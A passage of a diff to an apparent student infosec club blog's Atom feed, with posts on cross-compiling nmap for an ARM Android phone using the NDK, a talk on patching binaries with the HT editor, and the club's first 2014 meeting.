+</pre></td><td class='code'><pre><code class='bash'><span class='line'>cat /proc/cpuinfo
+</span></code></pre></td></tr></table></div></figure>
 
 
+<p>Looks like its running ARMv7 rev 3.</p>
+
+<p><img class="center" src="http://sheepshellcode.com/images/android/android-cpuinfo.png" width="719" height="404"></p>
+
+<p>Now that I knew which architecture I needed, I actually had to compile the software. This is where I started to encounter a few issues. Turns out cross compiling is signifigantly more invloved than I anticipated. I was very tempted to simply download and run the binaries found here: <a href="http://ftp.linux.hr/android/nmap/nmap-6.46-android-arm-bin.tar.bz2">http://ftp.linux.hr/android/nmap/nmap-6.46-android-arm-bin.tar.bz2</a></p>
+
+<p>Yet&hellip; this was a community donated program that isn&rsquo;t located in official repositories. The author didn&rsquo;t even provide an md5 hash. This was also for nmap 6.46 instead of 6.47. Furthermore given the &ldquo;.hr&rdquo; domain the binary appeared to be hosted somewhere in croatia? This risk of the program being back doored seemed to be a little out of my comfort zone so I went off and downloaded the nmap sourcecode.</p>
+
+<p>To solve the cross compiling issue I ended up using the android NDK found here: <a href="https://developer.android.com/tools/sdk/ndk/index.html">https://developer.android.com/tools/sdk/ndk/index.html</a></p>
+
+<p>I did a bit more exploring to see if somone had used the NDK to compile nmap before. Turns out they had. <a href="https://github.com/kost/nmap-android/Makefile">https://github.com/kost/nmap-android/Makefile</a> After I read through the Makefile so I had a full understanding of what it was doing, I noticed that there were several issues with it and this was confirmed by other comments on the issues tab. These were issues from 2 years ago which unfortunately were unresolved. Rather than rewriting the make file from scratch I decided to modify the existing make file so it actually worked. You can find it here: <a href="https://github.com/quantumvm/AndroidNmap/blob/master/android/Makefile">https://github.com/quantumvm/AndroidNmap/blob/master/android/Makefile</a></p>
+
+<p>After running the make file as &ldquo;make doit&rdquo; I encountered another issue but this time with the actual NDK itself. Turns out there was an issue caused by bash that was making the script make-standalone-toolchain.sh fail. I located the syntax error at line 723 and changed:</p>
+
+<p><strong>OLD</strong></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="k">for</span> ABI in <span class="k">$(</span>tr <span class="s1">&#39;,&#39;</span> <span class="s1">&#39; &#39;</span> <span class="o">&lt;&lt;&lt;</span> <span class="nv">$ABIS</span><span class="k">)</span><span class="p">;</span> <span class="k">do</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
+<p><strong>NEW</strong></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="k">for</span> ABI in <span class="k">$(</span><span class="nb">echo</span> <span class="s2">&quot;$ABIS&quot;</span> <span class="p">|</span> tr <span class="s1">&#39;,&#39;</span> <span class="s1">&#39; &#39;</span><span class="k">)</span><span class="p">;</span> <span class="k">do</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
+<p>I then once again ran the make file but this time with the havendk argument:
+make havendk</p>
+
+<p>SUCCESS the screen filled with a bunch of ascii art that appears when you compile nmap manually. :&lsquo;)</p>
+
+<p><img class="center" src="http://sheepshellcode.com/images/android/android-nmap.png" width="719" height="404"></p>
+
+<p>I didn&rsquo;t feel like rooting my phone to get the binary to run. Instead I just copied the binary from my sd card&rsquo;s Download folder into the Terminal apps home directory located at /data/data/jackpal.androidterm Before the binary could actaully be run it was necissary to run chmod on it. Nmap does have a few dependencies which need to be copied onto the sdcard. Based on our makefile they must be located in /sdcard/opt/nmap-6.47 most notable is the nmap-services file. This has to be located at /sdcard/opt/nmap-6.47/share/nmap</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Binary Patching]]></title>
+    <link href="http://sheepshellcode.com/blog/2014/09/14/binary-patching/"/>
+    <updated>2014-09-14T01:53:36-04:00</updated>
+    <id>http://sheepshellcode.com/blog/2014/09/14/binary-patching</id>
+    <content type="html"><![CDATA[<center><iframe width="640" height="360" src="//www.youtube.com/embed/juEDAMjNvOE" frameborder="0" allowfullscreen></iframe>
+</center>
 
 
+<p>I had a lot of fun at this weeks meeting! I gave a presentation on how to start patching binaries using the HT editor. I also gave a brief introduction to the structure of a linux executable.</p>
+
+<p>Hte hex editor that comes in the handy command line format. All you have to do is run <em>hte [program name]</em> and your popped in an ncurses environment where you can examine the executable in different modes.</p>
+
+<p>Check out <a href="http://sheepshellcode.com/tutorials/RED-MOD/red-mod-0.pdf">RED MOD 0</a> for the written tutorial!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[First SIT Meeting 2014]]></title>
+    <link href="http://sheepshellcode.com/blog/2014/09/14/first-sit-meeting/"/>
+    <updated>2014-09-14T01:14:27-04:00</updated>
+    <id>http://sheepshellcode.com/blog/2014/09/14/first-sit-meeting</id>
+    <content type="html"><![CDATA[<center><iframe width="640" height="360" src="//www.youtube.com/embed/s3k5UXFt4qw" frameborder="0" allowfullscreen></iframe>
+</center>
 
 
+<p>I was absolutely thrilled to introduce a new group of <strong>ninjas</strong> to the first Student Infosec Team meeting of 2014. This meeting took place in CSE 312 (capable of holding 30 bodies)  and the room filled slightly beyond its capacity.</p>
 
-
-
-
-</body>
-</html>
+<p>For the first time ever we decided to film meetings and put them on YouTube. I was quite impressed by the quality. Our setup consisted of an HD webcam and an internal microphone.</p>
+]]></content>
+  </entry>
+  
+</feed>
